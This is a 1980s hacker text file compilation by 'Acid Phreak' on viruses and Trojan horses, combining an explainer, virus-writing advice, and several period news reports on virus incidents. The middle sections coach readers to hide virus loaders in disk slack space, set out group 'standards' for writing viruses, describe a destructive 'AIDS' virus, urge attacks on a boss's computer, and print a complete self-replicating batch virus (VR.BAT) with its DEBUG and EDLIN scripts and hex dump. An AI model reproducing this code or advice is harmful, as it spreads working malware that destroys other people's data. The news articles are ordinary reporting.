                  Explanation of Viruses and Trojans Horses
                  -----------------------------------------
                            Written by Acid Phreak

    Like it's biological counterpart, a computer virus is an agent of
infection, insinuating itself into a program or disk and forcing its host
to replicate the virus code.  Hackers fascinated by the concept of "living"
code wrote the first viruses as projects or as pranks.  In the past few
years, however, a different kind of virus has become common, one that lives
up to an earlier meaning of the word:  in Latin, virus means poison.
    These new viruses incorporate features of another type of insidious
program called a Trojan horse.  Such a program masquerades as a useful
utility or product but wreaks havoc on your system when you run it.  It may
erase a few files, format your disk, steal secrets--anything software can
do, a Trojan horse can do.  A malicious virus can do all this then attempt
to replicate itself and infect other systems.
    The growing media coverage of the virus conceptand of specific viruse
has promoted the development of a new type of software.  Antivirus programs,
vaccines--they go by many names, but their purpose is to protect from virus
attack.  At present there are more antivirus programs than known viruses
(not for long).
    Some experts quibble about exactly what a virus is.  The most widely
known viruses, the IBM Xmas virus and the recent Internet virus, are not
viruses according to some experts because they do not infect other programs.
Others argue that every Trojan horse is a virus--one that depends completely
on people to spread it.

How They Reproduce:
-------------------
    Viruses can't travel without people.  Your PC will not become infected
unless someone runs an infected program on it, whether accidentally or on
purpose.  PC's are different from mainframe networks in this way--the
mainframe Internet virus spread by transmitting itself to other systems and
ordering them to execute it as a program.  That kind of active transmission
is not possible on a PC.
    Virus code reproduces by changing something in your system.  Some viruses
strike COMMAND.COM or the hidden system files.  Others, like the notorious
Pakistani-Brain virus, modify the boot sector of floppy disks.  Still others
attach themselves to any .COM or .EXE file.  In truth, any file on your
system that can be executed--whether it's a program, a device driver, an
overlay, or even a batch file--could be the target of a virus.
    When an infected program runs, the virus code usually executes first and
then transfers control to the original program.  The virus may immediately
infect other programs, or it may load itself into RAM and continue spreading.
If the virus can infect a file that will be used on another system, it has
succeeded.

What They Can Do:
-----------------
    Viruses go through two phases:  a replication phase and an action phase.
The action doesn't happen until a certain even occurs--perhaps reaching a
special date or running the virus a certain number of times.  It wouldn't
make sense for a virus to damage your system the first time it ran; it needs
some time to grow and spread first.
    The most vulnerable spot for a virus attack is your hard disk's file
allocation table (FAT).  This table tells DOS where every file's data resides
on the disk.  Without the FAT, the data's still there but DOS can't find it.
A virus could also preform a low-level format on some or all the tracks of
your hard disk, erase all files, or change the CMOS memory on AT-class
computers so that they don't recognize the hard disk.
    Most of the dangers involve data only, but it's even possible to burn
out a monochrome monitor with the right code.
    Some virus assaults are quite subtl.  One known virus finds four
consecutive digits on the screen and switches two.  Let's hope you're not
balancing the company's books when this one hits.  Others slow down system
operations or introduce serious errors.

        Ok,  wow!  You've just  invented  the most  incredibly nifty virus.  It
slices, it dices, it squshes,  it mushes (sorry Berke Breathed)  people's data!
But the only problem is, if you go around infecting every damn file,  some cute
software company is going to  start putting in  procedures that  checksum their
warez each time they run, which will make life for your infecting virus a total
bitch. Or somebody's going to come up with an incredibly nifty vaccination util
that will wipe it out. Because, i mean,  hey,  when disk space starts vanishing
suddenly in 500K chunks people tend to notice.  Especially people  like me that
rarely have more than 4096 bytes free on their HD anyway. Ok.  So you're saying
"wow, so what, I can make mine fool-proof", etc, etc. But wait! There's no need
to go around wasting your precious time when the answer is right there in front
of you! Think about it,  you could be putting that time into writing better and
more inovative viruses,  or you could be  worring about keeping  the file size,
the date & time, and the attributes the same.  With this system,  you only need
to infect one file, preferably one that's NOT a system file, but something that
will get run alot, and will be able  to load your nifty virus on a daily basis.
This system also doesn't take up any disk space, other than the loader. And the
loader could conceivably be under  16 bytes (damn near undetectable).  First of
all, you need to know what programs to infect. Now, everybody knows about using
COMMAND.COM and that's unoriginal anyway,  when there are other programs people
run all the time. Like DesqView  or Norton Utilities or  MASM or  a BBS file or
WordPerfect; you get the idea. Better still are dos commands like Format,  Link
or even compression utilities.  But you get the point. Besides,  who's going to
miss 16 bytes, right? Now, the good part: where to put the damn thing. One note
to the programmer:  This could get  tricky if  your virus  is over  2k or isn't
written in Assembly, but the size problem is easy enough, it would  be a simple
thing to break your virus  into parts and have  the parts load each  other into
the system so that you do eventually get the whole thing. The only problem with
using  languages besides assembly  is that it's  hard to  break them up into 2k
segments. If you want to infect floppys, or smaller disks, you'd be best off to
break your file into 512 byte segments, since they're easier to hide. But, hey,
in assembly, you can generate pretty  small programs that do alot, tho.  Ok, by
now you've probably figured  out that we're talking  about the part of the disk
called 'the slack'. Every disk that your computer uses is divided up into parts
called sectors, which are (in almost all cases) 512 bytes. But in larger disks,
and even in floppies,  keeping track of every single sector would be a complete
bitch. So the sectors  are bunched together  into groups  called 'clusters'. On
floppy disks,  clusters are  usually  two sectors,  or 1024 bytes,  and on hard
disks, they're typically 4096 bytes, or eight sectors.  Now think about it, you
have  programs on  your  hard disk,  and what are  the odds that they will have
sizes that always end up in increments of 4096? If I've  lost you,  think of it
this way: the file takes up a  bunch of  clusters,  but in  the last cluster it
uses, there is usually some 'slack', or space that isn't used by the file. This
space is between where the actual file ends and  where the actual cluster ends.
So, potentially, you can have up  to 4095 bytes of 'slack'  on a file on a hard
disk, or 1023 bytes of 'slack' on a floppy.  In fact, right now, run the Norton
program  'FS /S /T'  command from your root directory,  and subtract  the total
size of the files from the total disk space used. That's how much 'slack' space
is on your disk (a hell of alot, even on a floppy). To  use the slack,  all you
need to do  is to  find a  chunk of slack  big enough to  fit your  virus (or a
segment of your virus)  and use direct disk access (INT 13)  to put  your virus
there.  There is one minor  problem with this.  Any disk write to that  cluster
will overwrite the slack with 'garbage' from memory. This is because of the way
DOS manages it's disk I/O and it can't  be fixed without alot of hassles.  But,
there is a way around even this. And it involves a popular  (abeit outdated and
usually ineffectual) form of  virus protection called the READ-ONLY flag.  This
flag is the greatest friend  of this type of virus.  Because if the file is not
written to,  the last cluster is not written to, and voila!  Your virus is safe
from mischivious accidents.  And since the R-O flag doesn't  affect INT 13 disk
I/O, it won't be in your way. Also, check for programs with the SYSTEM flag set

because that has the same Read-only effect (even tho I haven't seen it written,
it's true that  if the  file is designated system,  DOS treats it as read-only,
whether the R-O flag is set or not).  The space after IBMBIOS.COM or IBMDOS.COM
in MS-DOS (not PC-DOS, it uses different files,  or so I am told; I've been too
lazy to find out myself) or a protected (!) COMMAND.COM  file in either type of
DOS would be ideal for this. All you have to do is then insert your loader into
some innocent-looking file, and you are in business.  All your loader has to do
is read  the sector into  the highest part of memory,  and do a far call to it.
Your virus cann then go  about waiting  for floppy disks  to infect,  and place
loaders on any available executable file on the disk. Sound pretty neet? It is!
Anyway, have fun, and be sure to upload your virus, along with a README file on
how it works to CPI  Headquarters so we  can check it out!  And remember: don't
target P/H/P boards  (that's Phreak/Hack/Pirate boards) with ANY virus. Even if
the Sysop is a leech and you want to  shove his balls down his throat.  Because
if all the PHP boards go down (especially members of CPI), who the hell can you
go to for all  these nifty  virus ideas?  And besides,  it's betraying your own
people,  which  is uncool even  if you  are an anarchist.  So, target uncool PD
boards, or your  boss's computer  or whatever,  but don't attack  your friends.
Other than that, have phun, and phuck it up!

Call these boards because the sysops are cool:
Oblivion                (SATAN HQ)   Sysop: Agent Orange   (SATAN leader)
System: Utopia          (SATAN HQ)   Sysop: Robbin' Hood   (SATAN leader)
The Andromeda Strain    (CPI HQ)     Sysop: Acid Phreak    (CPI leader)
D.U.N.E.                (DUNE HQ)    Sysop: Freddy Krueger (DUNE leader)
The Jolly Bardsmen's Pub & Tavern
The Sierra Crib

        One of the  main problems with viruses is that  once you set one loose,
it is no longer under your control.  I propose to stop this by introducing some
standards of  virus writing that will  enable them to  be deactivated  whenever
they enter a 'friendly' (CPI) system.  In the long run,  even the author of the
virus is not immune to being attacked. The following are what I have termed the
CPI standards for writing viruses.  They will allow a virus to easily check any
system they are  being run on  for a type of 'identity badge'.  If it is found,
the virus will  not infect the  system it is being run on.  The other standards
are mostly written around this.

CPI Standards for writing viruses -

        1 - The virus will have  an 'active  period' and an  'inactive period'.
            The active periods will be no more than one year in length (to make
            it more difficult to discover the virus). You may release different
            versions of your virus  with different 'active periods'.  It is not
            recommended that your  virus deactivate itself after the set active
            period, as this would enable  people to deactivate viruses by using
            their computer with the date set  to 2069 or something.  It is also
            required  that  activation  periods  begin on January 1  and end on
            December 31. This will coincide  with the changing  identity codes.

        2 - The virus will check for an  identity code by  executing Interrrupt
            12h  with the  following register  settings:  AX - 4350, BX - 4920,
            CX - AB46, DX - 554E.  If the system  is  friendly, then a  pointer
            will be returned in CX:DX to an ASCIIZ (0-terminated) string  which
            will have different contents in different years.  The codes are not
            to be included in any text file,  and should only  be given through
            E-mail on CPI affiliated systems.  You can always ask me by sending
            me  mail at  The Andromeda Strain BBS.  If a system  is detected as
            friendly, the virus will not attempt to infect or damage it, but it
            is ok  to display a  little  greeting message  about  how lucky the
            user was.

        3 - We very much encourage you to upload your virus, along with a breif
            description on the  workings into the  CPI section at The Andromeda
            Strain BBS.  Only CPI members  will know about your virus.  This is
            so that CPI members  can share techniques and  it also allows us to
            verify that  the identity check works.  If we see  any improvements
            that could be made, such as ways to streamline code, better ways of
            spreading, etc. we will inform you so that you can make the changes
            if you wish.

        4 - It is also suggested that you use ADS standard for virus storage on
            infected disks.  This meathod uses disk slack space for storage and
            is more thoroughly described in a previous text file by me. I think
            that this is the most effective  and invisible way to store viruli.

        5 - A list of CPI-Standard  viruli will be  avaliable at all times from
            The Andromeda Strain BBS, to CPI users.  Identity strings will also
            be available to anyone in CPI, or anyone who uploads source code to
            a virus which is 100%  complete except for  the Identity string (it
            must be written to CPI-Standards). Non-CPI members who do this will
            be more seriously considered for membership in CPI.

 Well well, here it is... I call it AIDS... It infects all COM files, but it is
 not perfect, so it will also change the date/time stamp to the current system.
 Plus, any READ-ONLY attributes will ward this virus off, it doesn't like them!

 Anyway, this virus was originally named NUMBER ONE, and I modified the code so
 that it would fit my needs. The source code, which is included with this neato
 package was written in Turbo Pascal 3.01a. Yeah I know it's old, but it works.

 Well, I added a few things, you can experiment or mess around with it if you'd
 like to, and add any mods to it that you want, but change the name and give us
 some credit if you do.

 The file is approximately 13k long, and this extra memory will be added to the
 file it picks as host. If no more COM files are to be found, it picks a random
 value from 1-10, and if it happens to be the lucky number 7, AIDS will present
 a nice screen with lots of smiles, with a note telling the operator that their
 system is now screwed, I mean permanantly. The files encrypted containing AIDS
 in their code are IRREVERSIBLY messed up. Oh well...

 Again, neither CPI nor the author of Number One or AIDS endorses this document
 and program for use in any illegal manner. Also, CPI, the author to Number One
 and AIDS is not responsible for any actions by the readers that may prove harm
 in any way or another. This package was written for EDUCATIONAL purposes only!

                            Batch Viruses
                            -------------


Whoever thought that viruses could be in BATCH file.This virus which we        

are about to see makes use of MS-DOS operating system. This BATCH virus
uses DEBUG & EDLIN programs.

Name: VR.BAT

echo = off         ( Self explanatory)
ctty nul           ( This is important. Console output is turned off)
path c:\msdos      ( May differ on other systems )
dir *.com/w>ind    ( The directory is written on "ind" ONLY name entries)      

edlin ind<1        ( "Ind" is processed with EDLIN so only file names appear)
debug ind<2        ( New batch program is created with debug)
edlin name.bat<3   ( This batch goes to an executable form because of EDLIN)
ctty con           ( Console interface is again assigned)
name               ( Newly created NAME.BAT is called.


In addition to file to this Batch file,there command files,here named 1,2,3

Here is the first command file:
-------------------------------
Name: 1

1,4d               ( Here line 1-4 of the "IND" file are deleted )
e                  ( Save file )

Here is the second command file:
--------------------------------
Name: 2

m100,10b,f000      (First program name is moved to the F000H address to save)  

e108 ".BAT"        (Extention of file name is changed to .BAT)
m100,10b,f010      (File is saved again)
e100"DEL "         (DEL command is written to address 100H)
mf000,f00b,104     (Original file is written after this command)
e10c 2e            (Period is placed in from of extension)
e110 0d,0a         (Carrige return+ line feed)
mf010,f020,11f     ( Modified file is moved to 11FH address from buffer area)
e112 "COPY \VR.BAT" ( COPY command is now placed in front of file)
e12b od,0a         (COPY command terminated with carriage return + lf)
rxc                ( The CX register is ... )
2c                 ( set to 2CH)
nname.bat          ( Name it NAME.BAT)
w                  ( Write )
q                  ( quit )


The third command file must be printed as a hex dump because it contains
2 control characters (1Ah=Control Z) and this is not entirely printable.

Hex dump of the third command file:
-----------------------------------
Name: 3

0100   31 2C 31 3F 52 20 1A 0D-6E 79 79 79 79 79 79 79 
       1  ,  1  ?        .  .  n  y  y  y  y  y  y  y
0110   79 29 0D 32 2C 32 3F 52-20 1A OD 6E 6E 79 79 79
       y     .  2  ,  ?  ?  r     .  .  n  n  y  y  y
0120   79 79 79 79 29 0D 45 0D-00 00 00 00 00 00 00 00
       y  y  y  y     .  E  .  .  .  .  .  .  .  .  .


In order for this virus to work VR.BAT should be in the root. This program
only affects .COM files.

                           Viruses in Basic
                           ----------------


Basic is great language and often people think of it as a limited language
and will not be of any use in creating something like a virus. Well you are
really wrong. Lets take a look at a Basic Virus created by R. Burger in 1987.
This program is an overwritting virus and uses (Shell) MS-DOS to infect .EXE
files.To do this you must compile the source code using a the Microsoft 
Quick-BASIC.Note the lenght of the compiled and the linked .EXE file and edit
the source code to place the lenght of the object program in the LENGHTVIR

This basic virus will only attack .EXE files. After the execution you will
see a "INH" file which contains the directory, and the file %SORT.EXE.
Programs which start with "%" are NOT infected ,they pose as back up copies.

;-----------------------------------------------------------------------;
; This virus is of the "FLOPPY ONLY" variety.                           ;
; It replicates to the boot sector of a floppy disk and when it gains control  
; it will move itself to upper memory.  It redirects the keyboard       ;
; interrupt (INT 09H) to look for ALT-CTRL-DEL sequences at which time  ;
; it will attempt to infect any floppy it finds in drive A:.            ;
; It keeps the real boot sector at track 39, sector 8, head 0           ;
; It does not map this sector bad in the fat (unlike the Pakistani Brain)
; and should that area be used by a file, the virus                     ;
; will die.  It also contains no anti detection mechanisms as does the  ;
; BRAIN virus.  It apparently uses head 0, sector 8 and not head 1      ;
; sector 9 because this is common to all floppy formats both single     ;
; sided and double sided.  It does not contain any malevolent TROJAN    ; 
; HORSE code.  It does appear to contain a count of how many times it   ;
; has infected other diskettes although this is harmless and the count  ;
; is never accessed.                                                    ;
;                                                                       ;
; Things to note about this virus:                                      ;
; It can not only live through an ALT-CTRL-DEL reboot command, but this ;
; is its primary (only for that matter) means of reproduction to other  ;
; floppy diskettes.  The only way to remove it from an infected system  ;
; is to turn the machine off and reboot an uninfected copy of DOS.      ;
; It is even resident when no floppy is booted but BASIC is loaded      ;
; instead.  Then when ALT-CTRL-DEL is pressed from inside of BASIC,     ;
; it activates and infectes the floppy from which the user is           ;
; attempting to boot.                                                   ;
;                                                                       ;
; Also note that because of the POP CS command to pass control to       ;
; its self in upper memory, this virus does not to work on 80286        ;
; machines (because this is not a valid 80286 instruction).             ;
;                                                                       ;
; If your assembler will not allow the POP CS command to execute, replace;
; the POP CS command with an NOP and then assemble it, then debug that  ;
; part of the code and place POP CS in place of NOP at that section.    ;
;                                                                       ;
; The Norton Utilities can be used to identify infected diskettes by    ;
; looking at the boot sector and the DOS SYS utility can be used to     ;
; remove it (unlike the Pakistani Brain).                               ;

                      There's A Virus In My Software

                      Mischief-makers at the computer
                     are deliberately endangering data

                             By Philip J. Hilts

                        Washington Post Staff Writer

      The Washington Post Weekly Edition, Page #38.  May 23-29, 1988.

     Tiny programs that are deliberately cause mischief are epidemic among
computers and causing nervousness among those who monitor them.  Since the
first tests of the notion in 1983 that machines can catch and spread
"information diseases," the computer world has reached the point at which as
many as thirty instances of "computer virus" have been reported in the past
year, affecting tens of thousands of U.S. computers alone.

     Such viruses have been found at the National Aeronautics and Space
Administration, International Business Machines Corporation, the House of
Representatives, at least six universities, several major computer networks
such as Comp-u-serve and several businesses, including the world's largest
computer-service company, the $4.4 billion Electronic Data Systems
Corporation of Dallas, Texas.

     Written by malicious programmers, the viruses are sneaked into computer
systems by piggybacking them on legitimate programs and messages.  There,
they may be passed along or instructed to wait until a prearranged moment to
burst forth and destroy data.

     Hundreds of computers at the Hebrew University of Jerusalem and other
places in Israel were hit last fall by a virus designed to spread and then,
in one swipe on a Friday the thirteenth, destroy all data in any computer it
could reach.

     If not for an error by it's author, who has not been caught, the virus
could have caused devastation among micro-computers in Israel and other
nations.  The virus did not check to see whether it already had infected a
program and so infected some computers hundreds of times, crowding their
memories enough to call attention to itself.

     In a seven-month campaign, programmers in Israel hastened to find
infected machines and ensure that the smallest number would be affected
before Friday, May 13th.  Officials say they initially thought that the
infection was connected with the anniversary of the last day that Palestine
existed as a political entity but subsequently decided that it most likely
involved just Friday the thirteenth.

     Apparently, the campaign was successful; there has been no word of
substantial damage.  This past Friday the thirteenth is this year's only such
day.

     At the Aldus Corporation of Seattle, Washington, a major software maker,
executives are huddling with lawyers to try to determine whether
international spread of such diseases is illegal.  No virus cases have been
taken to court.

     At N.A.S.A. headquarters in Washington, several hundred computers had to
be resuscitated after being infected.  N.A.S.A. officials have taken
precautions and reminded their machines' users to follow routine computer
hygiene: Don't trust foreign data or strange machines.

     Viruses have the eerie ability to perch disguised among legitimate data
just as biological viruses hide among genes in human cells, then spring out
unexpectedly, multiplying and causing damage.  Experts say that even when
they try to study viruses in controlled conditions, the programs can get out
of control and erase everything in a computer.  The viruses can be virtually
impossible to stop if their creators are determined enough.

     "The only way to protect every-body from them is to do something much
worse than the viruses: Stop talking to one another with computers," says
William H. Murray, an information-security specialist at Ernst and Whinney
financial consultants in Hartford, Connecticut.

     Hundreds of programs and files have been destroyed by viruses, and
thousands of hours of repair or prevention time have been logged.
Programmers have quickly produced antidote programs with such titles as
"Vaccine," "Flu Shot," "Data Physician," "Syringe."

     Experts says known damage is minimal compared with the huge, destructive
potential.  They express the hope that the attacks will persuade computer
users to minimize access to programming and data.

     "What we are dealing with here is the fabric of trust in society," says
Murray.  "With computer viruses, we have a big vulnerability."

     Early this year, Aldus Corporation discovered  that a virus had been
introduced that infected at least five-thousand copies of a new drawing
program called Freehand for the Macintosh computer.  The infected copies were
packaged, sent to stores and sold.  On March 2, the virus interrupted users
by flashing this message on their screens:

     "Richard Brandow, publisher of MacMag, and its entire staff would like
to take this opportunity to convey their universal message of peace to all
Macintosh users around the world."

     Viruses are the newest of evolving methods of computer mayhem, says
Donn B. Parker, a consultant at SRI International, a computer research firm
in Menlo Park, California.  One is the "Trojan horse," a program that looks
and acts like a normal program but contains hidden commands that eventually
take effect, ordering mischief.  Others include the "time bomb," which
explodes at a set time, and the "logic bomb," which goes off when the
computer arrives at a certain result during normal computation.  The "salami
attack" executes barely noticeable results small acts, such as shaving a
penny from thousands of accounts.

     The computer virus has the capability to command the computer to make
copies of the virus and spread them.  A virus typically is written only as a
few hundred characters in a program containing tens of thousands of
characters.  When the computer reads legitimate instructions, it encounters
the virus, which instructs the computer to suspend normal operations for a
fraction of a second.

     During that time, the virus instructs the computer to check for other
copies of itself and, if none is found, to make and hide copies.  Instruction
to commit damage may be included.  A few infamous viruses found in the past
year include:

[]   The "scores" virus.  Named after a file it spawns, it recently entered
     several hundred Macintosh computers at N.A.S.A. headquarters.  "It looks
     as if it searching for a particular Macintosh program with a name that
     no one recognizes," spokesman Charles Redmond says.

         This virus, still spreading, has reached computers in Congress'
     information system at the National Oceanic and Atmospheric
     Administration and at Apple Computer Incorporated's government-systems
     office in Reston, Virginia.  It has hit individuals, businesses and
     computer "bulletin boards" where computer hobbyists share information.
     It apparently originated in Dallas, Texas and has caused damage, but
     seemingly only because of its clumsiness, not an instruction to do
     damage.

[]   The "brain" virus.  Named by its authors, it was written by two brothers
     in a computer store in Lahore, Pakistan, who put their names, addresses
     and phone number in the virus.  Like "scores," it has caused damage
     inadvertently, ordering the computer to copy itself into space that
     already contain information.

[]   The "Christmas" virus.  It struck last December after a West German
     student sent friends a Christmas message through a local computer
     network.  The virus told the receiver's computer to display the
     greeting, then secretly send the virus and message to everyone on the
     recipient's regular electronic mailing list.

         The student apparently had no idea that someone on the list had
     special, restricted access to a major world-wide network of several
     thousand computers run by I.B.M.  The network broke down within hours
     when the message began multiplying, stuffing the computers' memories.
     No permanent damage was done, and I.B.M. says it has made repetition
     impossible.

     Demonstrations have shown that viruses can invade the screens of users
with the highest security classification, according to Fred Cohen of
Cincinnati, a researcher who coined the term "computer Viruses."  A standard
computer-protection device at intelligence agencies, he says, denies giving
access by a person at one security level to files of anyone else at a higher
level and allows reading but denies writing of files of anyone lower.

     This, however, "allows the least trusted user to write a program that
can be used by everyone" and is "very dangerous," he says.

     Computers "are all at risk," says Cohen, "and will continue to be... not
just from computer viruses.  But the viruses represent a new level of threat
because of their subtleness and persistence."


1.) Computer "viruses" are actually immature computer programs.  Most are
    written by malicious programmers intent on destroying information in
    computers for fun.

2.) Those who write virus programs often conceal them on floppy disks that
    are inserted in the computer.  The disks contain all programs needed to
    run the machine, such as word processing programs, drawing programs or
    spread sheet programs.

3.) A malicious programmer makes the disk available to others, saying it
    contains a useful program or game.  These programs can be lent to others
    or put onto computerized: "bulletin boards" where anyone can copy them
    for personal use.

4.) A computer receiving the programs will "read" the disk and the tiny virus
    program at the same time.  The virus may then order the computer to do a
    number of things:

    A.) Tell it to read the virus and follow instructions.

    B.) Tell it to make a copy of the virus and place it on any disk inserted
        in the machine today.

    C.) Tell it to check the computer's clock, and on a certain date destroy
        information that tells it where data is stored on any disk: if an
        operator has no way of retrieving information, it is destroyed.

    D.) Tell it not to list the virus programs when the computer is asked for
        an index of programs.

5.) In this way, the computer will copy the virus onto many disks--perhaps
    all or nearly all the disks used in the infected machine.  The virus may
    also be passed over the telephone, when one computer sends or receives
    data from another.

6.) Ultimately hundreds or thousands of people may have infected disks and
    potential time bombs in their systems.


              -----------------------------------------------
                    'Virus' infected hospital computers,
                    led to epidemic of software mix-ups
              -----------------------------------------------
                         From the San Diego Tribune
                               March 23, 1989


     BOSTON (UPI) -- A "virus" infected computers at three Michigan hospitals
last fall and disrupted patient diagnoses at two of the centers in what appears
to be the first such invasion of a medical computer, it was reported yesterday.

     The infiltration did not harm any patients but delayed diagnoses by
shutting down computers, creating files of non-existent patients and garbling
names on patient records, which could have caused more serious problems, a
doctor said.

     "It definitely did affect care in delaying things and it could have
affected care in terms of losing this information completely," said Dr. Jack
Juni, a staff physician at the William Beaumont Hospitals in Troy and Royal Oak,
Mich., two of the hospitals involved.

     If patient information had been lost, the virus could have forced doctors
to repeat tests that involve exposing patients to radiation, Juni said
yesterday.  The phony and garble files could have caused a mix-up in patient
diagnosis, he said.

     "This was information we were using to base diagnoses on," said Juni, who
reported the case in a letter in The New England Journal of Medicine. "We were
lucky and caught it in time."

     A computer virus is a set of instructions designed to reproduce and spread
from computer to computer.  Some viruses do damage in the process, such as
destroying files or overloading computers.

     Paul Pomes, a computer virus expert at the University of Illinois in
Champaign, said this was the first case he had heard of in which a virus had
disrupted a computer used for patient care or diagnosis in a hospital.

     Such disruptions could become more common as personal computers are used
more widely in hospitals, Juni and Pomes said.  More people know how to program
-- and therefore sabotage -- personal computers than the more specialized
computers that previously have been used, Pomes said.

     The problem in Michigan surfaced when a computer used to display images
used to diagnose cancer and other diseases began to malfunction at the 250-bed
Troy hospital in August 1988.

     In October, Juni discovered a virus in the computer in the Troy hospital.
The next day, Juni found the same virus in a similar computer in the 1,200-bed
Royal Oak facility, he said.

     The virus apparently arrived in a program in a storage disk that was part
of the Troy computer system, he said.  It probably was spread inadvertently to
the Royal Oak computer on a floppy disk used by a resident who worked at both
hospitals to write a research paper, he said.

      The virus also spread to the desk-top computers at the University of
Michigan Medical Center in Ann Arbor, where it was discovered before it caused
problems.


           "Prosecutor Wins Conviction In Computer Data Destruction"

                               September 21, 1988


     Fort Worth, Texas (AP) - A former programmer has been convicted of planting
a computer "virus" in his employer's system that wiped out 168,000 records and
was activated like a timb bomb, doing its damage two days after he was fired.

     Tarrant County Assistant District Attorney Davis McCown said he believes e
is the first prosecutor in the country to have someone convicted for destroying
computer records using a "virus."

     "We've had people stealing through computers, but not this type of case,"
McCown said. "The basis for this offense is deletion."

     "It's very rare that the people who spread the viruses are caught," said
John McAfee, chairman of the Computer Virus Industry Association in Santa Clara,
which helps educate the public about viruses and find ways to fight them.

     "This is absolutely the first time" for a conviction, McAfee said.

     "In the past, prosecutors have stayed away from this kind of case because
they're too hard to prove," McCown said yesterday. They have also been reluctant
because the victim doesn't want to let anyone know there has been a breach of
security."

     Donald Gene Burleson, 40, was convicted of charges of harmful access to a
computer, a third-degree feloy that carries up to 10 years in prison and up to
$5,000 in fines.

     A key to the case was the fact that State District Judge John Bradshaw
allowed the computer program that deleted the files to be introduced as
evidence, McCown said. It would have been difficult to get a conviction
otherwise, he said.

     The District Court jury deliberated six hours before bringing back the
first conviction under the state's 3-year-old computer sabotage law.

     Burleson planted the virus in revenge for his firing from an insurance
company, McCown said.

     Jurors were told during a technical and sometimes-complicated three-week
trial that Burleson planted a rogue program in the computer system used to store
records at USPA and IRA Co., a Fort Worth-based insurance and brokerage firm.

     A virus is a computer program, often hidden in apparently normal computer
software, that instructs the computer to change or destroy information at a
given time or after a certain sequence of commands.

     The virus, McCown said, was activated Sept. 21, 1985, two days after
Burleson was fired as a computer programmer, because of alleged personality
conflicts with other employees.

     "There were a series of programs built into the system as early as Labor
Day (1985)," McCown said. "Once he got fired, those programs went off."

     The virus was discovered two days later, after it had eliminated 168,00
payroll records, holding up company paychecks for more than a month. The virus
could have caused hundreds of thousands of dollars in damage to the system had
it continued, McCown said.
